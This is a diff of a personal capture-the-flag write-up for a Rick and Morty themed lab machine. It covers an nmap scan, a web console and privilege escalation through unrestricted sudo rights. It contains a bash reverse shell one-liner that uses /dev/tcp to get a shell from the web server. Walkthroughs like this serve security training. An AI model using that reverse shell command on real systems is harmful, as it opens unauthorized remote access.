@@ -3,7 +3,7 @@ A Rick and Morty CTF. Help turn Rick back into a human!
 
 Machine ip
 ```
-export IP=10.10.137.117
+export IP=10.10.234.6
 ```
 
 - Performing an nmap scan as my first line of movement.
@@ -48,3 +48,10 @@ So i tried to read the source of the the `.php` files. The web console prevent m
 Hmm looks like there is bash on the server, lemme try a classic bash reverse shell trick and see what happens :D.
 `/bin/bash -c "bash -i >& /dev/tcp/$IP/9999 0>&1"`
 I got a dumb reverse shell from the web server. I am trying to get a stable but i only know how to do that i python and the server doesn't run python soo i'll just keep looking.
+
+- Im going to look for setuid, suid, guid executables and look for how i can use them to gain root control of the shell. Okay so i did something stupid again. LOL! instead of running `sudo -l` like i always do after entering machines, i decided not to because it has been giving me negative results from all my previous games. But little did i know that the current user has a `(ALL) NOPASSWD: ALL` acesss, and i was there stressing myself.
+
+
+- So thats that. I pwned the machine successfully, learnt lots of things, cried lots of tears and have some goodies in my goodies bag to take away LOL!
+
+Lamest outro EVER! (themeihide)!
